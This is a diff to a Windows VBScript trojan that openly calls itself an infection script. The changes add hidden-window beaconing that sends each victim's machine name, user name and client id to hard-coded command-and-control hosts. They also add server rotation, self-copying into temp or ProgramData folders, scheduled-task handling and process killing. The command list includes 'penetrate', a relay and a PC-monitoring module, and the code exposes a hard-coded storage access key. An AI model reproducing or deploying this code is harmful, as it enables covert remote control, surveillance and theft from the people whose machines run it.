@@ -28,13 +28,63 @@ Function LogErr()
         Exit Function
     End IF
     
-    Call LogMsg("Err.Number=" & Err.Number)
+    Call LogMsg("Err.Number=" & Hex(Err.Number))
     Call LogMsg("Err.Description=" & Err.Description)
     Call LogMsg("Err.Source=" & Err.Source)
 End Function
 
+Function PushEventMother(eventcode)
+    Call LogMsgMotherT(eventcode,"event")
+End Function
+
 Function LogMsgMother(msg)
-	' execute logmsg.php GET request to mothership /ow/logmsg.php
+    Call LogMsgMotherT(msg,"msg")
+End Function
+
+Function LogMsgMotherT(msg,tag)
+    On Error Resume Next
+    Err.Clear
+    
+    Dim pp : pp = "LogMsgMotherT"
+    
+    If XIsEmpty(tag) Then
+        tag = "msg"
+    End If
+    
+    Call LogMsg(pp & ": " & msg & " " & tag)
+    
+    Dim umsg : umsg = msg
+    
+    Dim tparams : tparams = GetScriptTagStrUrlDirect()
+    tparams = tparams & "&" & URLEncode(tag) & "=" & URLEncode(umsg)
+    
+    Dim result
+    Dim res : res = HttpGet(mothership & "/ow/logmsg.php?" & tparams, result)
+    
+    If not res then
+        Call LogMsg("LogMsgMotherT :: ERROR :: retrying using curl")
+        
+        Dim params : params =  GetScriptTagStrUrl()
+        params = params & "--data-urlencode" & " " & dq & tag & "=" & umsg & dq
+        
+        res = RunShell("conhost.exe --headless cmd /c curl -ks -G " & mothership & "/ow/logmsg.php" & " " & params, true)
+    End If
+    
+    If not res then
+        Call LogMsg(pp & " :: ERROR :: failed to exec get request")
+    End If
+    
+    LogMsgMotherT = res
+    
+    If Err.Number<>0 Then
+        Call LogMsg(pp & " reporting error")
+        Call LogErr()
+        LogMsgMotherT = False
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & " finished")
+    
 End Function
 
 Function LogMsg(msg)
@@ -51,6 +101,35 @@ Function LogMsg(msg)
         logfObj.WriteLine msg
     End If
     
+End Function
+
+Function GetMD5Hash(fpath, outfpath)
+    GetMD5Hash = ""
+    
+    If XIsEmpty(fpath) Then
+        Exit Function
+    End IF
+    
+    Call LogMsg("GetMD5Hash")
+    
+    Dim ret : ret = RunShell("cmd /c certutil -hashfile " & fpath  & " md5 > " & outfpath, True)
+    
+    If not ret Then
+        Exit Function
+    End IF
+    
+    If Not fso.FileExists(outfpath) Then
+        Exit Function
+    End IF
+    
+    Dim content : content = ReadFile(outfpath)
+    Dim linesArray : linesArray = Split(content, vbCrLf)
+
+    If UBound(linesArray) >= 1 Then
+        GetMD5Hash = linesArray(1)
+    End If
+
+    Call LogMsg("GetMD5Hash: " & GetMD5Hash)
 End Function
 
 Function GetProcessName(pid)
@@ -114,8 +193,59 @@ Function GetTimestamp()
     GetTimestamp = ts
 End Function
 
+Function HeadersToDict(responsetext)
+    Err.Clear
+    
+    set HeadersToDict = nothing
+
+    If XIsEmpty(responsetext) Then
+        exit function
+    End IF
+    
+    Call LogMsg("HeadersToDict -- begin")
+    
+    Dim headerLines : headerLines = Split(responsetext, vbCrLf)
+
+    Dim myDict
+    Set myDict = CreateObject("Scripting.Dictionary")
+
+    Dim line
+    For Each line In headerLines
+        If Trim(line) <> "" and InStr(line, ":") >= 1 Then
+            Dim parts
+            parts = Split(line, ":")
+            
+            If UBound(parts) >= LBound(parts) Then
+                Dim keystr : keystr = parts(0)
+                
+                Dim i : i = 1
+                do while myDict.Exists(keystr)
+                    keystr = parts(0) & "_" & CStr(i)
+                    i = i + 1
+                loop
+                
+                Call LogMsg("keystr: " & keystr & " line: " & line)
+                myDict.Add keystr, line
+                
+            End IF
+            
+        End If
+    Next
+
+    set HeadersToDict = myDict
+
+    Call LogMsg("HeadersToDict -- finished")
+
+End Function
+
 Function DownloadFile(sURL, sFile)
-    DownloadFile = False
+    Dim headers
+    DownloadFile = DownloadFileWithHeaders(sURL, sFile, headers)
+End Function
+
+Function DownloadFileWithHeaders(sURL, sFile, headers)
+    Dim pp : pp = "DownloadFileWithHeaders"
+    DownloadFileWithHeaders = False
     On Error Resume Next
     Err.Clear
     
@@ -123,7 +253,7 @@ Function DownloadFile(sURL, sFile)
         Exit Function
     End If
     
-    Call LogMsg("DownloadFile: " & sURL & " " & sFile & " " & GetTimestamp())
+    Call LogMsg(pp & ": " & sURL & " " & sFile & " -- " & GetTimestamp())
 
     Dim objHTTP, objStream
     
@@ -131,51 +261,57 @@ Function DownloadFile(sURL, sFile)
     objHTTP.Open "GET", sURL, False
     objHTTP.Send
 
-    Call LogMsg("DownloadFile: " & objHTTP.Status & " " & objHTTP.StatusText )    
+    Call LogMsg(pp & ": " & objHTTP.Status & " " & objHTTP.StatusText )    
     
     If objHTTP.Status <> 200 Then
-        Call LogMsg("DownloadFile: error: objHTTP.Status is not 200")
+        Call LogMsg(pp & ": error: objHTTP.Status is not 200")
         Exit Function
     End If
     
 
     If XIsEmpty(objHTTP.ResponseBody) Then
-        Call LogMsg("DownloadFile: ResponseBody is empty")
+        Call LogMsg(pp & ": ResponseBody is empty")
         Exit Function
     End If
     
-    Set objStream = CreateObject("ADODB.Stream")
-    objStream.Type = 1 ' adTypeBinary
-    objStream.Open
+   
+    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders()
+    Call LogMsg(pp & ": header: " & vbCrLf & allHeadersstr & vbCrLf & "--- END ---" & vbCrLf )
 
+    set headers = HeadersToDict(allHeadersstr)
+
+    If not XIsEmpty(objHTTP.ResponseBody) Then
+        Call LogMsg(pp & " writing ResponseBody out to file: " & sFile)
+
+        Set objStream = CreateObject("ADODB.Stream")
+        objStream.Type = 1 ' adTypeBinary
+        objStream.Open
+
+        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1
+
+        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
+	
+        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
+        objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
+        objStream.Close
+        Set objStream = Nothing
+
+    end if
     
-    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
-    Call LogMsg("DownloadFile: header: " & allHeadersstr)
-
-    Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1
-
-    Call LogMsg("DownloadFile: ResponseBody bytes: " & allHeadersstr)
-
-    objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
-    objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
-    
-    If Err.Number <> 0 Then
-        Call LogMsg("DownloadFile: Err.Number=" & Err.Number)
-        Call LogMsg("DownloadFile: Err.Description=" & Err.Description)
-        Call LogMsg("DownloadFile: Err.Source=" & Err.Source)
-        
-        Err.Clear 
-    End If
-
-
-    objStream.Close
-    Set objStream = Nothing
     Set objHTTP = Nothing
+
+	If Err.Number <> 0 Then
+		Call LogErr()
+		DownloadFileWithHeaders = false
+		Exit Function
+    End If
+	
+	DownloadFileWithHeaders = true
     
-    DownloadFile = true
+    Call LogMsg(pp & " finished")
 End Function
 
-Function URLEncode(ByVal str)
+Function URLEncode(str)
     URLEncode = ""
     
     If XIsEmpty(str) Then
@@ -225,15 +361,50 @@ Function GetRandom(n)
     GetRandom = Mid(GetRandom, 1, n)
 End Function
 
-Function IsEightDigitInteger(strValue)
-    Dim regEx
-    Set regEx = New RegExp
-    ' Pattern: ^ (start), \d{8} (exactly 8 digits), $ (end)
-    regEx.Pattern = "^\d{8}$"
-    IsEightDigitInteger = regEx.Test(strValue)
+Function ExtractText(inpingstr, begin_token, end_token)
+    
+    If XIsEmpty(inpingstr) Then
+        Exit Function
+    End If
+    
+    Call LogMsg("ExtractText: " & begin_token & " " & end_token)
+    
+    ExtractText = ""
+    
+    Dim start_position : start_position = InStr(1, inpingstr, begin_token, 1)
+
+    if ( start_position <= 0 ) Then
+        Exit Function
+    end if
+    
+    Dim end_position : end_position = InStr(1, inpingstr, end_token, 1)        
+
+    start_position = start_position + Len(begin_token)
+    
+    if ( end_position <= 0 ) or ( start_position >= end_position ) Then
+		Exit Function
+    End if
+    
+    ExtractText = Mid(inpingstr, start_position, end_position-start_position)
+
+    if begin_token = "EXEC_CMD_BEGIN" then
+        
+        if (Mid(ExtractText,1,1) = "|") then
+            ExtractText = Mid(ExtractText,2,Len(ExtractText)-1)
+        end if
+
+        if (Mid(ExtractText,Len(ExtractText),1) = "|") then
+            ExtractText = Mid(ExtractText,1,Len(ExtractText)-1)
+        end if
+        
+    end if
+    
+    Call LogMsg("ExtractText finished")
+
 End Function
 
 Function Reset(fpath)
+    Call LogMsg("Reset " & fpath)
     
     If XIsEmpty(fpath) Then
         Exit Function
@@ -243,6 +414,10 @@ Function Reset(fpath)
     
     fpath = Trim(fpath)
        
+    If fso.FileExists(fpath) Then
+        fso.DeleteFile(fpath)
+    End If
+    
     Dim fileObj : Set fileObj = fso.CreateTextFile(fpath, True)
     
 				  
@@ -251,8 +426,10 @@ Function Reset(fpath)
     Set fileObj = Nothing
 
 									 
-    Call RunShell("conhost.exe --headless cmd /c type nul > " & fpath, True)
-		  
+
+    If not fso.FileExists(fpath) Then
+        Call RunShell("conhost.exe --headless cmd /c type nul > " & fpath, True)
+    End If
     
 End Function
 
@@ -293,32 +470,6 @@ Function ReadTag(fpath)
     
 End Function
 
-Function ReadMothership(fpath)
-    ReadMothership = mothership
-    
-    If XIsEmpty(fpath) Then
-        Exit Function
-    End If
-    
-    fpath = Trim(fpath)
-    
-    If Not fso.FileExists(fpath) Then
-        Exit Function
-    End If
-    
-    Dim objFile : set objFile = fso.OpenTextFile(fpath, 1)
-    
-    ReadMothership = objFile.ReadLine
-
-    ReadMothership = Replace(Replace(ReadMothership, vbCr, ""), vbLf, "")
-    ReadMothership = Trim(ReadMothership)
-        
-   
-    objFile.Close
-    Set objFile = Nothing
-
-End Function
-
 Function ReadClientId(clientidpath)
     Dim objFile
     
@@ -351,21 +502,20 @@ Function ReadClientId(clientidpath)
     clientidstr = Replace(Replace(clientidstr, vbCr, ""), vbLf, "")
     clientidstr = Trim(clientidstr)
         
-    If IsEightDigitInteger(clientidstr) Then
-        ReadClientId = CStr(clientidstr)
-    End If
+    ReadClientId = CStr(clientidstr)
     
     objFile.Close
     Set objFile = Nothing
 End Function
 
 Function ExecShellAsync(cmdstr)
+    Dim pp : pp = "ExecShellAsync"
     
     If XIsEmpty(cmdstr) Then
         Exit Function
     End If
     
-    Call LogMsg("ExecShell: " & cmdstr)
+    Call LogMsg(pp & ": " & cmdstr)
     
     Const HIDDEN_WINDOW = 0
     Dim strComputer : strComputer = "."
@@ -389,6 +539,8 @@ Function ExecShellAsync(cmdstr)
     End If
 
     ExecShellAsync = intPID
+    
+    Call LogMsg(pp & ": finished")
 End Function
 
 Function RunShell(cmdstr, sync)
@@ -407,6 +559,8 @@ Function RunShell(cmdstr, sync)
     Call LogMsg("runshell: intReturn: " & CStr(intReturn))
 
     If Err.Number <> 0 Then
+        RunShell = False
+        
         Call LogMsg("runshell: Err.Number: " & Err.Number)
         Call LogMsg("runshell: Err.Source: " & Err.Source)
         Call LogMsg("runshell: Err.Description: " & Err.Description)
@@ -420,6 +574,31 @@ Function RunShell(cmdstr, sync)
     Else
         RunShell = false
     End If
+End Function
+
+Function KillTaskPid(tpid)
+    
+    Call LogMsg("KillTaskPid -- starting")
+    
+    IF XIsEmpty(tpid) Then
+        Call LogMsg("KillTaskPid -- empty pid -- exiting")
+        Exit Function
+    End If
+    
+    Dim res : res = RunShell("conhost.exe --headless cmd /c taskkill /f /pid " & tpid, true)
+    
+    Dim qstr : qstr = "winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"
+    
+    Dim objWMIService : Set objWMIService = GetObject(qstr)
+
+    Dim colProcessList : Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where ProcessId = " & CStr(pid))
+
+    Dim objProcess
+    For Each objProcess in colProcessList
+        objProcess.Terminate()
+        exit for
+    Next
+
 End Function
 
 Function ToTaskTime(startTime)
@@ -455,7 +634,7 @@ Function CreateTaskXML(taskname, taskxmlpath)
     CreateTaskXML = ret
 End Function
 
-Function GetScripTag()
+Function GetScriptTag()
     Dim objDict : Set objDict = CreateObject("Scripting.Dictionary")
 
     objDict.Add "clientid", clientid
@@ -464,34 +643,70 @@ Function GetScripTag()
     objDict.Add "scriptts", scriptts
     objDict.Add "machinename", machinename
     objDict.Add "username", username
+    objDict.Add "scriptmd5", scriptmd5
     
-    Set GetScripTag = objDict
+    if not XIsEmpty(sessionid) Then
+        objDict.Add "sessionid", sessionid
+    end if
+
+    if not XIsEmpty(jobcode) Then
+        objDict.Add "jobcode", jobcode
+    end if
+
+    if not XIsEmpty(batchid) Then
+        objDict.Add "batchid", batchid
+    end if
+    
+    Set GetScriptTag = objDict
 End Function
 
-Function GetScripTagStr()
-    GetScripTagStr = ""
+Function GetScriptTagStr()
+    GetScriptTagStr = ""
     
-    Dim scripttag : Set scripttag = GetScripTag()
+    Dim scripttag : Set scripttag = GetScriptTag()
     
     Dim keys : keys = scripttag.Keys
     Dim strKey
 
     For Each strKey In keys
-        GetScripTagStr = GetScripTagStr & "[" & strKey & "]=[" & scripttag.Item(strKey) & "]|"
+        GetScriptTagStr = GetScriptTagStr & "[" & strKey & "]=[" & scripttag.Item(strKey) & "]|"
     Next
 
 End Function
 
-Function GetScripTagStrUrl()
-    GetScripTagStrUrl = ""
+Function GetScriptTagStrUrlDirect()
+    GetScriptTagStrUrlDirect = ""
     
-    Dim scripttag : Set scripttag = GetScripTag()
+    Dim scripttag : Set scripttag = GetScriptTag()
     
     Dim keys : keys = scripttag.Keys
     Dim strKey
 
+	Dim i : i = 0
     For Each strKey In keys
-        GetScripTagStrUrl = GetScripTagStrUrl & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
+		
+		If i = 0 Then
+			GetScriptTagStrUrlDirect = URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
+		Else
+			GetScriptTagStrUrlDirect = GetScriptTagStrUrlDirect & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
+		End IF
+		
+		i = i + 1
+    Next
+
+End Function
+
+Function GetScriptTagStrUrl()
+    GetScriptTagStrUrl = ""
+    
+    Dim scripttag : Set scripttag = GetScriptTag()
+    
+    Dim keys : keys = scripttag.Keys
+    Dim strKey
+
+	' --data-urlencode "source=zfei.vbs" 
+    For Each strKey In keys
+		GetScriptTagStrUrl = GetScriptTagStrUrl & " --data-urlencode " & dq & strKey & "=" & scripttag.Item(strKey) & dq & " "
     Next
 
 End Function
@@ -566,6 +781,8 @@ Function WriteFile(fpath, msgstr)
         msgstr = ""
     End If
     
+    Call LogMsg("WriteFile: " & fpath)
+    
     Const ForWriting = 2
     Const CreateIfNotExist = True
 
@@ -578,37 +795,231 @@ Function WriteFile(fpath, msgstr)
 
 End Function
 
-Function SelectMothership()
-    Call LogMsg("SelectMothership")
-
-    Randomize
-    Dim randomNumber : randomNumber = Int((100 * 1 + 1) * Rnd + 1)
+Function HttpGet(urlstr, ByRef result)
+    Dim pp : pp = "HttpGet"
+    HttpGet = False
     
-    If randomNumber <= 33 Then
-        SelectMothership = mothershipbackup
-    Elseif randomNumber > 33 and randomNumber <= 66 Then
-        SelectMothership = mothershipping
-    Else
-        SelectMothership = mothershipmaster
+    On Error Resume Next
+    Err.Clear
+    
+    If XIsEmpty(urlstr) Then
+        Exit Function
     End If
+    
+    Call LogMsg(pp & ": " & urlstr)
 
-    Call LogMsg("SelectMothership: randomNumber: " & CStr(randomNumber) & " " & SelectMothership)
+    Set result = CreateObject("Scripting.Dictionary")
+    
+    Dim objHTTP, objStream
+    
+    Call LogMsg(pp & " sending request...")
+    
+    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
+    objHTTP.Open "GET", urlstr, False
+
+    Call LogErr()
+
+    objHTTP.Send
+
+    Call LogErr()
+
+    Call LogMsg(pp & ": status: " & objHTTP.Status & " " & objHTTP.StatusText )    
+    
+    If XIsEmpty(objHTTP.ResponseBody) Then
+        Call LogMsg("HttpGet: ResponseBody is empty")        
+    End If
+        
+    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
+    Call LogMsg(pp & ": headers: " & vbCrLf & allHeadersstr & vbCrLf )
+
+    result.Add "headers", allHeadersstr
+    
+    If Not XIsEmpty(objHTTP.ResponseBody) Then
+        Call LogMsg(pp & ": writing ResponseBody to memory" )
+
+        Set objStream = CreateObject("ADODB.Stream")
+        objStream.Type = 1 ' adTypeBinary
+        objStream.Open
+
+        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1
+
+        result.Add "bodybytecount", count
+
+        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
+        
+        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
+       
+        result.Add "ResponseBody", objStream.Read
+        
+        objStream.Close
+        Set objStream = Nothing    
+    End If
+    
+    Set objHTTP = Nothing
+
+	If Err.Number <> 0 Then
+        Call LogMsg(pp & " logging error")
+
+        result.Add "error", Err.Number
+        
+		Call LogErr()
+		HttpGet = false
+		Exit Function
+    End If
+    
+    HttpGet = true
+
+    Call LogMsg(pp & " finished")
 
 End Function
 
+Function SelectMothership()
+    Dim listptr
+    
+    Call LogMsg("SelectMothership")
+    
+    listptr = mothershiplist
+    If istpl Then
+        Call LogMsg("switching to tpl mothership list")
+        listptr = tplmothershiplist
+    End If
+    
+	Dim n : n = UBound(mothershiplist)+1
+	
+    if istpl then
+    	n = UBound(tplmothershiplist)+1
+    end if
+    
+    selectedmothershipindex = 0
+    
+    If not XIsEmpty(mothership) Then
+        
+        Dim elemstr
+        Dim i : i = 0
+        For Each elemstr In listptr 
+            
+            If LCase(mothership) = LCase(elemstr) Then
+                Call LogMsg("mothership => " & CStr(elemstr))
+                selectedmothershipindex = i
+                Exit For
+            End If
+            
+            i = i + 1
+        Next
+        
+    End If
+    
+	selectedmothershipindex = selectedmothershipindex + 1
+    
+    if istpl then        
+        Randomize 
+
+        selectedmothershipindex = selectedmothershipindex + Int(n * Rnd() + 1)
+    end if
+	
+	if selectedmothershipindex >= n then
+		selectedmothershipindex = 0
+	end IF
+	
+    if istpl then
+        mothership = tplmothershiplist(selectedmothershipindex)
+    else
+        mothership = mothershiplist(selectedmothershipindex)
+	end if
+    
+	SelectMothership = mothership
+	
+    Call WriteFile( workdir & "\" & "mothership", mothership )
+
+    Call LogMsg("SelectMothership: " & CStr(selectedmothershipindex) & " " & mothership)
+
+End Function
+
+Function OverWriteFile(srcpath, destpath)
+	Call LogMsg("OverWriteFile -- starting")
+	
+	If XIsEmpty(srcpath) then
+		Call LogMsg("OverWriteFile -- srcpath is empty string -- exiting")
+		Exit Function
+	End IF
+	
+	If not fso.FileExists(srcpath) then
+		Call LogMsg("OverWriteFile -- srcpath file does not exist -- exiting")
+		Exit Function
+	End if
+	
+	Call TryDeleteFile(destpath)
+	
+	If not fso.FileExists(destpath) then
+		Call TryCopyFile(srcpath, destpath)
+	End IF
+	
+	Call LogMsg("OverWriteFile -- finished")
+End Function
+
+Function TryCopyFile(srcpath, destpath)
+    If XIsEmpty(srcpath) or XIsEmpty(destpath) Then
+        Exit Function
+    End IF
+    
+    Call LogMsg("TryCopyFile: " & srcpath & " " & destpath)
+        
+    If Not fso.FileExists(destpath) Then
+        fso.CopyFile srcpath, destpath, True
+    End IF    
+    
+    If Not fso.FileExists(destpath) Then
+        Call RunShell("conhost.exe --headless cmd /c copy /y " & srcpath & " " & destpath, True)
+    End IF
+
+End Function
+
+Function TryDeleteFile(fpath)
+    Call LogMsg("TryDeleteFile: " & fpath)
+    
+	If not fso.FileExists(fpath) then
+		Exit Function
+	end IF
+	
+    If fso.FileExists(fpath) Then
+        fso.DeleteFile fpath, true
+    End If
+    
+    If fso.FileExists(fpath) Then
+        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & fpath, True)
+    End If
+    
+End Function
+
+
 ' --- BEGIN: globals static initialization
+
+Dim appDataPath : appDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")
 
 Dim dq : dq = Chr(34)
 Dim tempPath : tempPath = fso.GetSpecialFolder(2)
 
-Dim mothershipmaster : mothershipmaster = "https://seashell-raven-793508.hostingersite.com"
-Dim mothershipping : mothershipping = "http://s1083932807.online-home.ca"
-Dim mothershipbackup : mothershipbackup = "https://darksalmon-crow-356809.hostingersite.com"
-Dim mothership : mothership = mothershipmaster
+Dim sessionid : sessionid = GetRandom(8) 
+Dim batchid : batchid = sessionid
+Dim jobcode : jobcode = "" 
 
-                               
+Dim tplmothershiplist()
+ReDim tplmothershiplist(0)
+tplmothershiplist(0) = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault"
 
-Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "upgrade", "execonecmd", "execvbs" )
+Dim mothershiplist()
+ReDim mothershiplist(2)
+mothershiplist(0) = "https://seashell-raven-793508.hostingersite.com"
+mothershiplist(1) = "http://s1083932807.online-home.ca"
+mothershiplist(2) = "https://darksalmon-crow-356809.hostingersite.com"
+
+Dim selectedmothershipindex : selectedmothershipindex = 0
+Dim mothership : mothership = mothershiplist(selectedmothershipindex)
+
+Dim mothershipassets : mothershipassets = "https://ny.storage.bunnycdn.com/testdev"
+Dim bunnyheader : bunnyheader="-H " & dq & "AccessKey: c64e71da-aac7-4b07-8ceb3fe9813f-af55-4d3a" & dq
+
+Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "startrelay", "startpcmon")
 
 Dim cmdname : cmdname = ""
 
@@ -627,6 +1038,9 @@ Dim scriptts : scriptts = GetTimestamp()
 Dim clientid : clientid = "abcdwxyz"
 Dim source : source = WScript.ScriptName
 Dim scriptpath : scriptpath = WScript.ScriptFullName
+Dim scriptdir : scriptdir = fso.GetParentFolderName(WScript.ScriptFullName)
+' WScript.CurrentDirectory
+
 Dim machinename : machinename = "LOCALHOST"
 Dim username : username = "UNKNOWNUSER"
 Dim script_version : script_version = "full_infection_script"
@@ -649,64 +1063,73 @@ If XIsEmpty(cmdname) Then
     cmdname = "init"
 End IF
 
-Dim tskname : tskname="OWD_retry_infection_vbs"
-Dim cmdlistdelaytime : cmdlistdelaytime=30
-Dim pingdelaytime : pingdelaytime=30
-Dim watchdogtimedelay : watchdogtimedelay=30
+
+Dim trojanname : trojanname = "owd"
+
+Dim tskname : tskname=UCase(trojanname) & "_retry_infection_vbs"
+
+Dim runnerdelaytime : runnerdelaytime = 60
+Dim cmdlistdelaytime : cmdlistdelaytime = 30
+Dim pingdelaytime : pingdelaytime = 30
+Dim watchdogtimedelay : watchdogtimedelay = 30
 Dim tskxmltime : tskxmltime=90 
 Dim timetaskxmltime : timetaskxmltime=90
 
-Dim workdir : workdir = tempPath & "\" & "owd" 
+Dim trojanfname : trojanfname = "zfei.vbs"
+
+Dim workdir : workdir = tempPath & "\" & trojanname 
 Dim exepath : exepath = workdir & "\" & "launch.exe"
 
+Dim configfpath : configfpath = workdir & "\" & "config.txt"
+Dim pythonpath : pythonpath = workdir & "\" & "python\work\Portable Python-3.10.5 x64\App\Python"
+Dim pythonexe : pythonexe = pythonpath & "\" & "python.exe"
+Dim relayfname : relayfname = "relay.py"
+Dim relaydir : relaydir = workdir & "\" & "relay"
+Dim pcmonfname : pcmonfname = "pcmon.exe"
+Dim pspcmonfname : pspcmonfname = "pc_monitoring.ps1"
+Dim pcmondir : pcmondir = workdir & "\" & "pcmon"
+
+
+Dim istplmode : istplmode = False
+
+If fso.FileExists(scriptdir & "\" & "tplmode") Then
+    istplmode = true
+End If
+
 Dim istpl : istpl = false 
-If LCase(Mid(script_version,1,3)) = "tpl" Or LCase(Mid(machinename, 1, 5)) = LCase("RLPCP") Then
+If LCase(Mid(machinename, 1, 5)) = LCase("RLPCP") Or istplmode Then
     istpl = True
     
     script_version = "tpl_full_infection_script"
-    workdir = "C:\ProgramData\OWD"
     tskxmltime = 15
     timetaskxmltime = 5
 
+    mothership = tplmothershiplist(selectedmothershipindex)
+
+    workdir = "C:\ProgramData\" & trojanname
+
     exepath = workdir & "\" & "tpl_launch.exe"
+	configfpath = workdir & "\" & "config.txt"
+	pythonpath = workdir & "\" & "python\work\Portable Python-3.10.5 x64\App\Python"
+	pythonexe = pythonpath & "\" & "python.exe"
+	relaydir = workdir & "\" & "relay"
+	pcmondir = workdir & "\" & "pcmon"
 
 End IF
 
 Dim logfpath: logfpath = workdir & "\" & "master_" & cmdname & "_" & scriptts & ".log"
 Dim logfObj : Set logfObj = fso.OpenTextFile(logfpath, 8, True)
 
+Dim lockfilepath : lockfilepath = workdir & "\" & trojanfname & "_" & cmdname & ".lock"
+Dim lockfileObj 
+
+If not fso.FileExists(workdir & "\" & "mothership") Then
+    Call WriteFile(workdir & "\" & "mothership", mothership)
+End If
+
+Dim scriptmd5
+
 ' --- END
-
-Function TryCopyFile(srcpath, destpath)
-
-    If XIsEmpty(srcpath) or XIsEmpty(destpath) Then
-        Exit Function
-    End IF
-    
-    Call LogMsg("TryCopyFile: " & srcpath & " " & destpath)
-        
-    If Not fso.FileExists(destpath) Then
-        fso.CopyFile srcpath, destpath, True
-    End IF    
-    
-    If Not fso.FileExists(destpath) Then
-        Call RunShell("conhost.exe --headless cmd /c copy /y " & srcpath & " " & destpath,True)
-    End IF
-
-End Function
-
-Function TryDeleteFile(fpath)
-    Call LogMsg("TryDeleteFile: " & fpath)
-    
-    If fso.FileExists(fpath) Then
-        fso.DeleteFile fpath, true
-    End If
-    
-    If fso.FileExists(fpath) Then
-        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & fpath, True)
-    End If
-    
-End Function
 
 Function Init()
     On Error Resume Next
@@ -719,25 +1142,50 @@ Function Init()
         WScript.Quit(1)
     End IF
 
-    mothership = SelectMothership()
-    
-    clientid = ReadClientId(workdir & "\" & "client_id")
-    
-    Call LogMsg("starting source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )
-
     If Not fso.FolderExists(workdir) Then
         fso.CreateFolder(workdir)
     End If
 
     WshShell.CurrentDirectory = workdir
 
-    If Not fso.FileExists(workdir & "\zfei.vbs") Then
-        fso.CopyFile scriptpath, workdir & "\zfei.vbs", True
+    Call LogMsg("attempting to obtain lock")
+    
+    Err.Clear
+
+    Call TryDeleteFile(lockfilepath)
+    
+    If Err.Number <> 0 Or fso.FileExists(lockfilepath) Then
+        Call LogMsg("singleton rule -- unable to delete lock file, exiting")
+        Call LogErr()
+        WScript.Quit(1)
+    Else
+        
+        Set lockfileObj = fso.OpenTextFile(lockfilepath, 8, True)
+        Call lockfileObj.WriteLine("locked")
+
+    End If
+            
+
+    If Not fso.FileExists(workdir & "\" & trojanfname) Then
+        fso.CopyFile scriptpath, workdir & "\" & trojanfname, True
     End If    
+
+    If fso.FileExists(workdir & "\" & "mothership") Then
+        Call LogMsg("mothership exists reading it")
+        mothership = ReadTag( workdir & "\" & "mothership" )
+    End If
     
-    Call RunShell("conhost.exe --headless cmd /c schtasks /delete /TN t /F", true)
-    Call RunShell("conhost.exe --headless cmd /c schtasks /delete /TN " & tskname & "_repx" & " /F", true)
+    If XIsEmpty(mothership) Then
+        mothership = SelectMothership()
+    End If
     
+    Call LogMsg("calculating MD5Hash")
+    scriptmd5 = GetMD5Hash(workdir & "\" & trojanfname, workdir & "\" & "scriptmd5" )
+        
+    clientid = ReadClientId(workdir & "\" & "client_id")
+    
+    Call LogMsg("starting source=" & source & " cmdname=" & cmdname & " cmdtaskname=" & cmdtaskname & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )
+    	
     If cmdname = "init" or cmdname = "task" Then
      
         StartupLogic()
@@ -746,13 +1194,20 @@ Function Init()
         WScript.Quit(0)
     End If
     
-    
     If InStr(LCase(Join(cmdslist)), LCase(cmdname)) >= 1 Then
+        Call LogMsg("Init: calling into " & cmdname)
+        
         Dim func : Set func = GetRef(cmdname)
         
         func()
+        
+        Call LogMsg("Init: " & cmdname & " finished")
+
     End If
 
+    Call LogMsg("Init -- reporting errors if any")
+    Call LogErr()
+    
     Call LogMsg("exiting")
     WScript.Quit(0)
     
@@ -764,7 +1219,164 @@ Call LogErr()
 Call LogMsg("fatal error -- reached unreachable point -- exiting")
 WScript.Quit(1)
 
-' --------
+' ---
+
+Function AddToArray(tarr, tvalue)
+	Err.Clear	
+	Call LogMsg("AddToArray -- starting")
+	
+	If Not IsArray(tarr) Then
+		Call LogMsg("AddToArray -- input array is not an array -- exiting")
+		Exit Function
+	End IF
+	
+	Dim matches : matches = Filter(tarr, tvalue)
+	Dim ismatch : ismatch = false
+
+	If UBound(matches) > -1 Then
+		ismatch = true
+	End If
+
+	if not ismatch then
+		ReDim Preserve tarr(UBound(tarr) + 1)
+		tarr(UBound(tarr)) = tvalue
+	end if
+
+	If Err.Number <> 0 then
+		Call LogMsg("AddToArray -- reporting errors")
+		Call LogErr()
+		Exit Function
+	End IF
+	
+	Call LogMsg("AddToArray -- finished")
+	
+End Function
+
+Function ParseConfig(configstr)
+	Call LogMsg("ParseConfig -- starting")
+	
+	If XIsEmpty(configstr) then
+        Call LogMsg("ParseConfig -- configstr is empty -- exiting")
+        Exit Function
+	End IF
+	
+	configstr = Replace(configstr, vbCrLf, vbLf)
+	configstr = Replace(configstr, vbCr, vbLf)
+
+	Dim textArray : textArray = Split(configstr, vbLf)
+	
+	Dim line : line = ""
+	
+	For Each line In textArray
+		Dim kkey : kkey = ""
+		Dim value : value = ""
+		
+		Dim parts : parts = Split(line, "=")
+
